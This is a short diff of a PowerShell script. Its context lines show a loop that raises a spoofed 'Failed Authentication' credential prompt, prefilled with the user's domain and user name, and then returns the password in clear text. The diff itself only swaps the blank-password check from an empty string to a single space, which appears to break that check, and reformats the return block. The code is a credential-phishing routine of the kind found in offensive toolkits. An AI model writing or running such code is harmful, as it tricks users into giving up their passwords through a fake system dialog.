@@ -55,14 +55,16 @@ while ($form -eq $null)
 {
     $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
 
-    if ($cred.Password -eq "")
+    if ($cred.Password -eq " ")
     {
         Write-Output "Credentials cannot be left blank. Please try again."
         $cred = $null
     }
     
-    else{$creds = $cred.GetNetworkCredential() | fl
-    return $creds}
+    else{
+    $creds = $cred.GetNetworkCredential() | fl
+    return $creds
+    }
 }
 }
 
